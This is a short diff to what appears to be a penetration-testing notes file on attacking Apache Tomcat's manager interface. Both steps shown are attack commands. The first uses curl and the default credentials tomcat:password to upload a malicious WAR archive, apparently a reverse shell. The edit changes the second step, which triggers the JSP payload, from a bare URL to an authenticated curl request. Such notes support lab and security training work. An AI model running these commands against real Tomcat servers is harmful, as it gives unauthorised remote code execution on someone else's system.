@@ -16,4 +16,4 @@ Deploy new application archive (WAR) remotely using curl.
 <br/>`curl -X PUT -T rev.war http://tomcat:password@10.10.10.50:8080/manager/text/deploy?path=/applicationname`
 
 Access new application archive to execute the JSP payload.
-<br/>`http://10.10.10.50:8080/applicationname/vnmsydlc.jsp`
+<br/>`curl -u 'tomcat':'password' http://10.10.10.50:8080/applicationname/vnmsydlc.jsp`
